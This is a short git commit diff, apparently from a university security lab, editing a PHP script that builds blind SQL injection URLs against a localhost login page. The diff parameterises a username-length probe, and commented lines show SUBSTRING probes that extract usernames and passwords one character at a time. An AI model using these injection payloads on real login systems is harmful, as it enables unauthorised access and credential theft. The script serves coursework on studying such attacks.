7487efff01aafd9181b4ee4aa4e9db55d9b95ee2
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-16 11:39:18 +0200

    test

--- script.php
+++ script.php
@@ -3,7 +3,9 @@
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"
 
-$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%205--%20";
+$i = 5;
+
+$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
 /*$counter = 0;
 while ($counter < 25)
 {
